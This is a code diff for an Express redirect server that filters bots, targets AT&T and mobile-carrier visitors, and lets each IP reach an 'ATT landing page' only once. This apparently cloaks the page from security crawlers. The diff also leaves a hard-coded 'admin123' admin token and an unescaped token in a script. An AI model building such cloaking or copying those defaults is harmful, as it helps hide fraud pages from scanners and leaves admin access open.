@@ -4,40 +4,73 @@ const path = require('path');
 const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
-const fs = require('fs');
+const fs = require('fs').promises;
+const fssync = require('fs');
 
 const app = express();
 const port = process.env.PORT || 3000;
+
+// Trust proxy for accurate IP detection behind load balancers
+app.set('trust proxy', 1);
 
 // Path to store visited IPs
 const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
 
 // Ensure the file exists
-if (!fs.existsSync(VISITED_IPS_FILE)) {
-    fs.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
+if (!fssync.existsSync(VISITED_IPS_FILE)) {
+    fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
 }
 
-function getVisitedIps() {
+async function getVisitedIps() {
     try {
-        const data = fs.readFileSync(VISITED_IPS_FILE, 'utf8');
-        return JSON.parse(data);
+        const data = await fs.readFile(VISITED_IPS_FILE, 'utf8');
+        let ips = JSON.parse(data);
+        
+        // Filter out IPs older than 24 hours
+        const now = Date.now();
+        const twentyFourHours = 24 * 60 * 60 * 1000;
+        const freshIps = ips.filter(entry => {
+            // Support both old format (string) and new format (object)
+            const timestamp = typeof entry === 'object' ? entry.timestamp : 0;
+            return (now - timestamp) < twentyFourHours;
+        });
+
+        if (freshIps.length !== ips.length) {
+            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(freshIps, null, 2));
+        }
+        return freshIps;
     } catch (e) {
         return [];
     }
 }
 
-function addVisitedIp(ip) {
-    const ips = getVisitedIps();
-    if (!ips.includes(ip)) {
-        ips.push(ip);
-        fs.writeFileSync(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
+async function addVisitedIp(ip) {
+    const ips = await getVisitedIps();
+    const existingIndex = ips.findIndex(entry => (typeof entry === 'object' ? entry.ip : entry) === ip);
+    
+    if (existingIndex === -1) {
+        ips.push({ ip, timestamp: Date.now() });
+        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
+    } else if (typeof ips[existingIndex] !== 'object') {
+        // Update old format to new format
+        ips[existingIndex] = { ip, timestamp: Date.now() };
+        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
     }
 }
 
-function removeVisitedIp(ip) {
-    const ips = getVisitedIps();
-    const newIps = ips.filter(i => i !== ip);
-    fs.writeFileSync(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
+async function removeVisitedIp(ip) {
+    const ips = await getVisitedIps();
+    const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
+    await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
+}
+
+function escapeHtml(str) {
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
 }
 
 // IMPORTANT: Set these environment variables in your hosting provider
@@ -45,6 +78,7 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
 const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin123'; // Default for safety, but should be set in env
 
 const MOBILE_ISPS = [
     'AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'US Cellular', 'Cricket', 'Metro', 'Boost', 'Xfinity', 
@@ -101,18 +135,27 @@ function isBot(req) {
     return BOT_USER_AGENTS.some(bot => ua.includes(bot));
 }
 
+// Admin Authentication Middleware
+function requireAdmin(req, res, next) {
+    const token = req.headers['x-admin-token'] || req.query.token;
+    if (token !== ADMIN_TOKEN) {
+        return res.status(401).send('Unauthorized: Invalid Admin Token');
+    }
+    next();
+}
+
 // Main endpoint to determine redirect
 app.get('/init', async (req, res) => {
     if (isBot(req)) {
         return res.json({ redirect: NON_ATT_LANDING_PAGE });
     }
 
-    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+    let clientIp = req.ip;
     
     // Check if user has already visited the ATT landing page
-    const visitedIps = getVisitedIps();
-    if (visitedIps.includes(clientIp)) {
+    const visitedIps = await getVisitedIps();
+    const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
+    if (isVisited) {
         return res.json({ redirect: NON_ATT_LANDING_PAGE });
     }
 
@@ -161,45 +204,57 @@ app.get('/init', async (req, res) => {
 });
 
 // Admin Panel to manage visited IPs
-app.get('/admin', (req, res) => {
-    const ips = getVisitedIps();
+app.get('/admin', requireAdmin, async (req, res) => {
+    const ips = await getVisitedIps();
+    const token = req.query.token || '';
     let html = `
         <!DOCTYPE html>
         <html>
         <head>
             <title>Admin Panel - Visited IPs</title>
             <style>
-                body { font-family: sans-serif; padding: 20px; }
-                table { border-collapse: collapse; width: 100%; max-width: 600px; }
-                th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+                body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
+                .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+                table { border-collapse: collapse; width: 100%; margin-top: 20px; }
+                th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                 th { background-color: #f4f4f4; }
-                .remove-btn { color: red; cursor: pointer; text-decoration: underline; }
+                .remove-btn { color: #d9534f; cursor: pointer; font-weight: bold; }
+                .remove-btn:hover { text-decoration: underline; }
+                .status { margin-bottom: 20px; color: #555; }
             </style>
         </head>
         <body>
-            <h1>Visited IPs Management</h1>
-            <p>These users have already visited the AT&T landing page and are currently restricted from visiting it again.</p>
-            <table>
-                <thead>
-                    <tr>
-                        <th>IP Address</th>
-                        <th>Action</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    ${ips.map(ip => `
+            <div class="container">
+                <h1>Visited IPs Management</h1>
+                <p class="status">These users have visited the AT&T landing page within the last 24 hours.</p>
+                <table>
+                    <thead>
                         <tr>
-                            <td>${ip}</td>
-                            <td><span class="remove-btn" onclick="removeIp('${ip}')">Remove</span></td>
+                            <th>IP Address</th>
+                            <th>Visited At</th>
+                            <th>Action</th>
                         </tr>
-                    `).join('')}
-                </tbody>
-            </table>
+                    </thead>
+                    <tbody>
+                        ${ips.map(entry => {
+                            const ip = typeof entry === 'object' ? entry.ip : entry;
+                            const time = typeof entry === 'object' ? new Date(entry.timestamp).toLocaleString() : 'N/A';
+                            return `
+                                <tr>
+                                    <td>${escapeHtml(ip)}</td>
+                                    <td>${escapeHtml(time)}</td>
+                                    <td><span class="remove-btn" onclick="removeIp('${escapeHtml(ip)}')">Allow Revisit</span></td>
+                                </tr>
+                            `;
+                        }).join('')}
+                    </tbody>
+                </table>
+            </div>
 
             <script>
                 async function removeIp(ip) {
-                    if (confirm('Are you sure you want to allow ' + ip + ' to revisit the landing page?')) {
-                        const response = await fetch('/api/admin/remove', {
+                    if (confirm('Allow ' + ip + ' to revisit the landing page?')) {
+                        const response = await fetch('/api/admin/remove?token=${token}', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ ip })
@@ -219,19 +274,17 @@ app.get('/admin', (req, res) => {
 });
 
 // Endpoint to remove an IP from the visited list
-app.post('/api/admin/remove', (req, res) => {
+app.post('/api/admin/remove', requireAdmin, async (req, res) => {
     const { ip } = req.body;
     if (!ip) return res.status(400).send('IP is required');
-    removeVisitedIp(ip);
+    await removeVisitedIp(ip);
     res.status(200).send('IP removed successfully');
 });
 
 // Redirect to AT&T landing page
-app.get('/go-att', (req, res) => {
-    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
-    
-    addVisitedIp(clientIp);
+app.get('/go-att', async (req, res) => {
+    const clientIp = req.ip;
+    await addVisitedIp(clientIp);
     res.redirect(ATT_LANDING_PAGE);
 });
 
